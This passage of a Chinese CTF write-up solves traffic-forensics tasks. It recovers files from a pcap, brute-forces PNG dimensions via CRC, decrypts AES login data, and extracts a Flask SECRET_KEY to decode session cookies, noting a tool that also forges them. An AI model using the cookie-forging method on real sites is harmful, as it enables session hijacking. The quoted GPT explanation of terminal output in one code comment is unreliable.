<h3 id="SmallSword-3"><a href="#SmallSword-3" class="headerlink" title="SmallSword_3"></a>SmallSword_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-11.png"></p>
<p>我们这时需要将流量包中的所有文件导出来查看一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.过滤http流</span><br><span class="line">2.点击左上角的&quot;文件&quot;-&gt;&quot;导出对象&quot;-&gt;&quot;HTTP对象列表&quot;</span><br><span class="line">3.点击&quot;save all&quot;-&gt;选择保存位置</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-12.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-13.png">    </p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-14.png"></p>
<p>文件导出完成后打开文件夹查看，发现一个很大的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-15.png"></p>
<p>打开这个文件发现是16进制的，所以我们用<code>010 Editor</code>打开。主要看文件头，16进制的<code>4D 5A</code>是<code>.exe</code>等文件的文件头，解码出来就是<code>MZ</code>。更多文件头请查看<code>/我的学习笔记/常见文件文件头.md</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-16.png"></p>
<p>我们删掉 <code>2D 3E 7C</code> ，后缀名改为 <code>.exe</code>，双击运行得到一张图（又是i春秋:），虽然在window上是正常打开的，但是拿到Linux是不能正常打开的，所以misc的图片可以第一时间拿到Linux上打开是否是正常的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-17.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-18.png"></p>
<p>再次使用<code>010 Editor</code>打开发现文件头显示这是一张 png 图片，我们改一下后缀重新打开，还是一样的。来到图片隐写。检查一下宽高</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-20.png"></p>
<p>现在需要我们回到16进制中修改，宽是正常的，我们修改一下高就可以了</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-21.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-22.png"></p>
<p>保存图片，重新打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-23.png"></p>
<p>这里写了一个python脚本直接爆破宽高并修改输出新图片，全自动</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,<span class="built_in">help</span>=<span class="string">&quot;输入同级目录下图片的名称&quot;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(args.f, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># -f 接文件</span></span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>]) <span class="comment"># 12~28 IHDR块包含宽高等信息。转化为bytearray对象</span></span><br><span class="line">crc32key = zlib.crc32(data) <span class="comment"># 根据宽高计算当前crc;取出fr字节序列从第12位到第28位(不包含第29位)的字节部分。</span></span><br><span class="line">original_crc32 = <span class="built_in">int</span>(fr[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="comment"># 取出29~32以整型赋值给crc32key，其实这就是当前写在照片里的crc码。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crc32key == original_crc32: <span class="comment"># 计算crc对比原始crc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    input_ = <span class="built_in">input</span>(<span class="string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> input_ <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;&quot;</span>]:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = <span class="number">4095</span></span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                    data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">                crc32result = zlib.crc32(data) <span class="comment"># 每次图片修改，根据宽高计算当前crc;取出fr字节序列从第12位到第28位(不包含第29位)的字节部分。</span></span><br><span class="line">                <span class="keyword">if</span> crc32result == original_crc32: <span class="comment"># 比较根据宽高计算出的crc码是否和写在照片中的一致</span></span><br><span class="line">                    <span class="built_in">print</span>(width,height) </span><br><span class="line">                    <span class="comment">#&#x27;&#x27;&#x27; 测试发现长宽带数字+字母的无法正常打印而是会打印出对应的ASCII码符号，请注意,例如1d,2c,3e会打印出符号，而c1,b2,cf等又可以正常显示。GPT这么解释只有数字在前字母在后的组合(如1d、2a),其他组合(如a1、d2)会打印正常,而非显示符号,原因是:在终端打印字符串时,许多驱动会尝试自动将非ASCII字符(code &gt; 127)替换为可显示的近似符号。对数字+字母这样的组合字符串来说:如果数字在前,字母的ASCII码就会构成一个完整的Unicode代码点。例如&#x27;1&#x27;(&#x27;31&#x27;)+&#x27;d&#x27;(&#x27;64&#x27;) = &#x27;1d&#x27;(&#x27;3164&#x27;),可以解读为一个unicode字符。但如果字母在前,就无法组成完整代码点了。所以终端驱动就会将以数字开头的串视为单个unicode字符进行显示,导致显示为替代符号;而其他组合依然只是单独的ASCII字节流,无法组成字符,所以会原样打印。&#x27;&#x27;&#x27;</span></span><br><span class="line">                    newpic = <span class="built_in">bytearray</span>(fr) <span class="comment"># 生成宽高正常的新图片</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                        newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                        newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">                    fw = <span class="built_in">open</span>(args.f+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">                    fw.write(newpic)</span><br><span class="line">                    fw.close</span><br><span class="line">                    exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面是修正版，不会输出字符了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_bytes</span>(<span class="params"><span class="built_in">bytes</span></span>):</span> <span class="comment"># 自定义打印函数，防止终端输出打印字符</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">bytes</span>))</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,<span class="built_in">help</span>=<span class="string">&quot;输入同级目录下图片的名称&quot;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(args.f, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># -f 接文件</span></span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>]) <span class="comment"># 12~28 IHDR块包含宽高等信息。转化为bytearray对象</span></span><br><span class="line">crc32key = zlib.crc32(data) <span class="comment"># 根据宽高计算当前crc;取出fr字节序列从第12位到第28位(不包含第29位)的字节部分。</span></span><br><span class="line">original_crc32 = <span class="built_in">int</span>(fr[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="comment"># 取出29~32以整型赋值给crc32key，其实这就是当前写在照片里的crc码。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crc32key == original_crc32: <span class="comment"># 计算crc对比原始crc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;宽高没有问题!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    input_ = <span class="built_in">input</span>(<span class="string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> input_ <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;&quot;</span>]:</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = <span class="number">4095</span></span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                    data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">                crc32result = zlib.crc32(data) <span class="comment"># 每次图片修改，根据宽高计算当前crc;取出fr字节序列从第12位到第28位(不包含第29位)的字节部分。</span></span><br><span class="line">                <span class="keyword">if</span> crc32result == original_crc32: <span class="comment"># 比较根据宽高计算出的crc码是否和写在照片中的一致</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;宽高分别为：&quot;</span>)</span><br><span class="line">                    print_bytes(width) </span><br><span class="line">                    print_bytes(height)</span><br><span class="line">                    newpic = <span class="built_in">bytearray</span>(fr) <span class="comment"># 生成宽高正常的新图片</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                        newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                        newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">                    fw = <span class="built_in">open</span>(args.f+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">                    fw.write(newpic)</span><br><span class="line">                    fw.close</span><br><span class="line">                    exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以flag为<code>flag3&#123;8fOdffac-5801-44a9-bd49-e66192ce4f57&#125;</code></p>
<h2 id="HD-flask"><a href="#HD-flask" class="headerlink" title="HD(flask)"></a>HD(flask)</h2><h3 id="hacked-1"><a href="#hacked-1" class="headerlink" title="hacked_1"></a>hacked_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-1.png"></p>
<p>既然是登录用户，那就是触发<code>login</code>功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login&quot; &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>这个流一眼嫌疑</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-2.png"></p>
<p>右键跟踪http流，发现登录用户密码,<code>CyberChef</code>解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=pl3HJGsgs1Zn43qjV5Qx8w==</span><br><span class="line">password=pl3HJGsgs1Zn43qjV5Qx8w==</span><br></pre></td></tr></table></figure>

<p>base64解码一下显示乱码，那可能不是base64</p>
<p>回去再看看流，我们看<code>login</code>流的开始，发现了<code>AES</code>加密，而且<code>key</code>和<code>IV</code>已给出，<code>CBC</code>模式</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-4.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crypt_key=l36DoqKUYQP0N7e1</span><br><span class="line">crypt_iv=131b0c8a7a6e072e</span><br></pre></td></tr></table></figure>

<p>再来解密一次，解出来账号密码居然都是<code>aaa</code>，显然这不是</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-6.png"></p>
<p>回去再看看登录成功的账号密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=UPFtSEoUfu4tgc6rUOc8Iw==</span><br><span class="line">password=7wcY1rS4D1x3A/n9AXUq5g==</span><br></pre></td></tr></table></figure>

<p>账号是<code>admin</code>，不是题目要求的<code>admIn</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-7.png"></p>
<p>密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-8.png"></p>
<p>接着继续找，上下翻流，然后解码账号观察是不是<code>admIn</code>就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login&quot; &amp;&amp; http.request.method==POST</span><br><span class="line">这样可以更加精确的过滤</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-9.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-10.png"></p>
<p>看一下密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-11.png"></p>
<p>所以flag为<code>flag&#123;WelC0m5_TO_H3re&#125;</code></p>
<h3 id="hacked-2"><a href="#hacked-2" class="headerlink" title="hacked_2"></a>hacked_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-12.png"></p>
<p>题目考察查看<code>flask</code>的配置文件<code>app.config</code>参数，文章<code>https://www.cnblogs.com/kaerxifa/p/11780941.html</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">常见:</span><br><span class="line">&#123;</span><br><span class="line">    &#x27;DEBUG&#x27;: False,  # 是否开启Debug模式</span><br><span class="line">    &#x27;TESTING&#x27;: False,  # 是否开启测试模式</span><br><span class="line">    &#x27;PROPAGATE_EXCEPTIONS&#x27;: None,  # 异常传播(是否在控制台打印LOG) 当Debug或者testing开启后,自动为True</span><br><span class="line">    &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None,  # 一两句话说不清楚,一般不用它</span><br><span class="line">    &#x27;SECRET_KEY&#x27;: None,  # 之前遇到过,在启用Session的时候,一定要有它</span><br><span class="line">    &#x27;PERMANENT_SESSION_LIFETIME&#x27;: 31,  # days , Session的生命周期(天)默认31天</span><br><span class="line">    &#x27;USE_X_SENDFILE&#x27;: False,  # 是否弃用 x_sendfile</span><br><span class="line">    &#x27;LOGGER_NAME&#x27;: None,  # 日志记录器的名称</span><br><span class="line">    &#x27;LOGGER_HANDLER_POLICY&#x27;: &#x27;always&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: None,  # 服务访问域名</span><br><span class="line">    &#x27;APPLICATION_ROOT&#x27;: None,  # 项目的完整路径</span><br><span class="line">    &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;,  # 在cookies中存放session加密字符串的名字</span><br><span class="line">    &#x27;SESSION_COOKIE_DOMAIN&#x27;: None,  # 在哪个域名下会产生session记录在cookies中</span><br><span class="line">    &#x27;SESSION_COOKIE_PATH&#x27;: None,  # cookies的路径</span><br><span class="line">    &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True,  # 控制 cookie 是否应被设置 httponly 的标志，</span><br><span class="line">    &#x27;SESSION_COOKIE_SECURE&#x27;: False,  # 控制 cookie 是否应被设置安全标志</span><br><span class="line">    &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True,  # 这个标志控制永久会话如何刷新</span><br><span class="line">    &#x27;MAX_CONTENT_LENGTH&#x27;: None,  # 如果设置为字节数， Flask 会拒绝内容长度大于此值的请求进入，并返回一个 413 状态码</span><br><span class="line">    &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: 12,  # hours 默认缓存控制的最大期限</span><br><span class="line">    &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: False,</span><br><span class="line">    # 如果这个值被设置为 True ，Flask不会执行 HTTP 异常的错误处理，而是像对待其它异常一样，</span><br><span class="line">    # 通过异常栈让它冒泡地抛出。这对于需要找出 HTTP 异常源头的可怕调试情形是有用的。</span><br><span class="line">    &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False,</span><br><span class="line">    # Werkzeug 处理请求中的特定数据的内部数据结构会抛出同样也是“错误的请求”异常的特殊的 key errors 。</span><br><span class="line">    # 同样地，为了保持一致，许多操作可以显式地抛出 BadRequest 异常。</span><br><span class="line">    # 因为在调试中，你希望准确地找出异常的原因，这个设置用于在这些情形下调试。</span><br><span class="line">    # 如果这个值被设置为 True ，你只会得到常规的回溯。</span><br><span class="line">    &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False,</span><br><span class="line">    &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;,  # 生成URL的时候如果没有可用的 URL 模式话将使用这个值</span><br><span class="line">    &#x27;JSON_AS_ASCII&#x27;: True,</span><br><span class="line">    # 默认情况下 Flask 使用 ascii 编码来序列化对象。如果这个值被设置为 False ，</span><br><span class="line">    # Flask不会将其编码为 ASCII，并且按原样输出，返回它的 unicode 字符串。</span><br><span class="line">    # 比如 jsonfiy 会自动地采用 utf-8 来编码它然后才进行传输。</span><br><span class="line">    &#x27;JSON_SORT_KEYS&#x27;: True,</span><br><span class="line">    #默认情况下 Flask 按照 JSON 对象的键的顺序来序来序列化它。</span><br><span class="line">    # 这样做是为了确保键的顺序不会受到字典的哈希种子的影响，从而返回的值每次都是一致的，不会造成无用的额外 HTTP 缓存。</span><br><span class="line">    # 你可以通过修改这个配置的值来覆盖默认的操作。但这是不被推荐的做法因为这个默认的行为可能会给你在性能的代价上带来改善。</span><br><span class="line">    &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: True,</span><br><span class="line">    &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">    &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">比较重要的：</span><br><span class="line">ENV：测试环境</span><br><span class="line">production：生产环境，development：开发环境</span><br><span class="line">DEBUG：是否开启debug模式</span><br><span class="line">SECRET_KEY：密钥字符串</span><br><span class="line">JSON_AS_ASCII：是否以ascii编码展示响应报文</span><br><span class="line">JSONIFY_MIMETYPE：响应报文类型</span><br></pre></td></tr></table></figure>

<p>这题让我们找密钥，直接过滤追踪带关键字的<code>tcp</code>流或<code>http</code>流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;SECRET_KEY&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-14.png"></p>
<p>追踪流</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-13.png"></p>
<p>所以flag为<code>ssti_flask_hsfvaldb</code></p>
<h3 id="hacked-3"><a href="#hacked-3" class="headerlink" title="hacked_3"></a>hacked_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-15.png"></p>
<p>SECRET_KEY：密钥字符串已经知道，而且从前面的流可以看到<code>cookie</code>的格式是JWT，那么这题考察的是解密JWT，要找到执行命令的包</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-16.png"></p>
<p>这个包是启动<code>flask</code>的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-17.png"></p>
<p>解法1：可以使用大佬的<code>cookie</code>伪造脚本可以加解密，python脚本使用密钥解密文章<code>https://blog.csdn.net/since_2020/article/details/119543172</code></p>
<p>脚本有解密、加密两种功能，需要知道SECRET_KEY值。具体用法如下<br><code>解密:</code>python3 flask_session_manager3.py decode -c “cookie值” -s “SECRET_KEY值” // -c是flask cookie里的session值 -s参数是SECRET_KEY<br><code>加密:</code>python flask_session_manager3.py encode -s “SECRET_KEY值” -t “{xxx}”// -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令行执行：</span><br><span class="line">python3 flask_session_cookie_manager3.py decode -s &quot;ssti_flask_hsfvaldb&quot; -c &quot;.eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04 AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-19.png"></p>
<p>解法2：也可以在线平台 Flask Session Cookie Decoder ，不需要SECRET_KEY值，直接将<code>cookie</code>放入即可<br><code>https://www.kirsle.net/wizards/flask-session.cgi</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/HD-18.png"></p>
<p>解法3：自己写一个python脚本在本地运行解密，不需要SECRET_KEY值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: flask-cookie-decode</span></span><br><span class="line"><span class="comment"># time: 2023/11/22 16:26</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;Flask session cookie decoder.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#import sys</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="comment">#from base64 import b64decode</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span 